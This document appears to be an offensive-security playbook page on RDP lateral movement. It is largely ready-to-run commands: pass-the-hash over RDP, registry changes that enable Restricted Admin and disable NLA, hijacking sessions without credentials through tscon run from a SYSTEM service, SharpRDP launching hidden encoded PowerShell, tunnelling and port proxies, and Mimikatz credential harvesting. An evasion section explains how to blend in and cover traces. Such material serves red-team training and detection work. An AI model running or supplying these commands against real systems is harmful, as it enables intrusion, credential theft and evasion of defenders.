# RDP Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1021.001 - Remote Services: Remote Desktop Protocol
> **Platforms**: Windows
> **Required Privileges**: Local Administrator or Remote Desktop Users group membership
> **OPSEC Risk**: Low

## Strategic Overview

Remote Desktop Protocol (RDP) is one of the most legitimate-looking lateral movement techniques available. In enterprise environments, RDP sessions from administrators to servers are routine and expected, making attacker RDP sessions extremely difficult to distinguish from normal operations. RDP provides a full graphical desktop session, which enables interaction with GUI-only applications, manual file browsing, and visual reconnaissance that command-line tools cannot replicate. The crown jewel of RDP-based lateral movement is session hijacking -- on a compromised server with SYSTEM access, you can take over any existing RDP session without knowing the user's credentials. This technique is devastating on shared servers like jump boxes, Citrix hosts, and RDS farms where high-privilege users maintain active sessions. The trade-off is that RDP sessions are interactive and require ongoing attention, making them less suitable for automated mass lateral movement.

### When RDP Is the Right Choice

- The target environment expects RDP traffic (servers, admin workstations)
- You need GUI access to interact with thick-client applications
- Session hijacking is available on multi-user servers
- Stealth is paramount -- RDP blends perfectly into admin traffic
- You need to perform visual reconnaissance or interact with desktop applications

## Technical Deep-Dive

### 1. Standard RDP Connection

```bash
# Linux -- xfreerdp (most capable open-source RDP client)
xfreerdp /u:administrator /p:'P@ssw0rd' /v:192.168.1.50 /cert:ignore /dynamic-resolution

# With domain credentials
xfreerdp /u:corp\\administrator /p:'P@ssw0rd' /v:192.168.1.50 /d:corp.local /cert:ignore

# Headless RDP (no GUI window -- useful for automated tool execution)
xfreerdp /u:administrator /p:'P@ssw0rd' /v:192.168.1.50 /cert:ignore +auth-only

# rdesktop (simpler alternative)
rdesktop -u administrator -p 'P@ssw0rd' 192.168.1.50

# Windows -- mstsc.exe
mstsc /v:192.168.1.50
# Then enter credentials in the GUI prompt
```

### 2. Pass the Hash over RDP (Restricted Admin Mode)

```bash
# Requires Restricted Admin mode enabled on target
# In Restricted Admin mode, credentials are NOT sent to the remote host
xfreerdp /u:administrator /pth:e19ccf75ee54e06b06a5907af13cef42 /v:192.168.1.50 /cert:ignore

# Check if Restricted Admin is enabled on target
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
# Value should be 0 (enabled) or key should not exist (disabled by default)

# Enable Restricted Admin remotely (requires other access vector)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Enable via CrackMapExec
crackmapexec smb 192.168.1.50 -u administrator -H HASH -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'

# Important: In Restricted Admin mode, the RDP session authenticates to the remote host
# using the machine's credentials for network access (not the user's credentials)
# This means you CANNOT access network resources from the RDP session as the user
# (Kerberos double-hop limitation)
```

### 3. RDP Session Hijacking (No Credentials Required)

```cmd
# This is extremely powerful: hijack an existing RDP session as SYSTEM
# Requires SYSTEM privileges on the target server

# Step 1: List active sessions
query user
# Output:
#  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
#  administrator         rdp-tcp#1           2  Active      .     2/8/2026 9:00 AM
#  domain_admin          rdp-tcp#3           4  Disconn     .     2/7/2026 3:00 PM

# Step 2: Hijack the session (as SYSTEM -- no password needed)
# Target the disconnected domain_admin session (ID 4)
tscon 4 /dest:rdp-tcp#1

# If you are running from a non-RDP context, create a service to run tscon as SYSTEM
sc create sesshijack binpath= "cmd.exe /k tscon 4 /dest:console"
net start sesshijack

# Alternative: Use PsExec to get SYSTEM context for tscon
PsExec.exe -s -i cmd.exe
tscon 4 /dest:rdp-tcp#1

# Hijack disconnected session to console session
tscon 4 /dest:console
```

### 4. SharpRDP (Command Execution via RDP)

```cmd
# SharpRDP executes commands over RDP without a full GUI session
# Uses keyboard input simulation through the RDP protocol

SharpRDP.exe computername=192.168.1.50 command="cmd /c whoami > C:\temp\out.txt" username=corp\administrator password=P@ssw0rd

# Execute PowerShell
SharpRDP.exe computername=192.168.1.50 command="powershell -nop -w hidden -enc BASE64" username=corp\administrator password=P@ssw0rd

# Connect to existing disconnected session
SharpRDP.exe computername=192.168.1.50 command="cmd /c whoami" username=corp\administrator password=P@ssw0rd connectdrive=true
```

### 5. Enabling RDP on Target

```cmd
# Enable RDP via registry (requires remote registry or other access)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable via WMI
wmic /node:TARGET /user:admin /password:pass path Win32_TerminalServiceSetting where AllowTSConnections=0 call SetAllowTSConnections 1

# Enable via PowerShell remoting
Invoke-Command -ComputerName TARGET -ScriptBlock {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
}

# Enable Network Level Authentication (NLA) bypass for older clients
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Open firewall for RDP
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

# Add user to Remote Desktop Users group
net localgroup "Remote Desktop Users" corp\targetuser /add
```

### 6. RDP Pivoting and Tunneling

```bash
# RDP through SSH tunnel
ssh -L 3389:192.168.1.50:3389 user@jumphost
xfreerdp /u:administrator /p:pass /v:127.0.0.1 /cert:ignore

# RDP through SOCKS proxy (Chisel, ligolo, etc.)
proxychains xfreerdp /u:administrator /p:pass /v:192.168.1.50 /cert:ignore

# RDP through Metasploit route
# After adding route in Metasploit:
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
# Then: proxychains xfreerdp /u:admin /p:pass /v:target

# Port forwarding with netsh (from compromised Windows host)
netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.1.50
```

### 7. RDP Credential Harvesting on Compromised Host

```powershell
# Extract RDP credentials stored by the client
# Saved RDP credentials location
dir %USERPROFILE%\AppData\Local\Microsoft\Credentials\
# Decrypt with Mimikatz: dpapi::cred /in:credential_file

# Extract RDP connection history
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# Keylog RDP sessions (if on an RDP gateway/jump host)
# Mimikatz: ts::mstsc (intercept RDP client credentials)
mimikatz# ts::mstsc

# Extract passwords from .rdp files
findstr /si "password" *.rdp
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4624** (Logon Type 10 - RemoteInteractive) for standard RDP logons
- **Event ID 4778/4779** (Session Connect/Disconnect) for session management
- **Event ID 1149** (Remote Desktop Services: User authentication succeeded) in TerminalServices-RemoteConnectionManager
- Unusual source IPs connecting to RDP (particularly from internal hosts that are not admin workstations)
- RDP session hijacking: tscon.exe execution, especially from SYSTEM context or as a service
- New services created with binPath containing tscon (hijacking indicator)
- Restricted Admin mode usage is logged and can be monitored

### Evasion Techniques

- RDP from expected admin workstations or jump hosts -- this is the most effective evasion
- Use Restricted Admin mode to avoid leaving credentials on the target (though this limits network access from the session)
- Hijack disconnected sessions rather than creating new ones (fewer logon events)
- RDP is encrypted by default -- network content inspection cannot see what happens inside the session
- Time connections during normal admin activity windows
- Use SharpRDP for quick command execution without maintaining a persistent GUI session
- If enabling RDP, re-disable it after use to maintain the original security posture

## Cross-References

- [[pass-the-hash]] - PtH feeds into RDP via Restricted Admin mode
- [[winrm-lateral]] - Alternative when RDP is unavailable or too interactive
- [[psexec-smbexec]] - Command-line alternative for non-GUI tasks
- Section 06: Credential Access - RDP credential harvesting
- Section 07: Persistence - Maintaining RDP access and configurations

## References

- https://attack.mitre.org/techniques/T1021/001/
- https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-organization-22f4e73ca4d6
- https://github.com/0xthirteen/SharpRDP
- https://www.kali.org/tools/freerdp2/
- https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-6f0620a1f4e
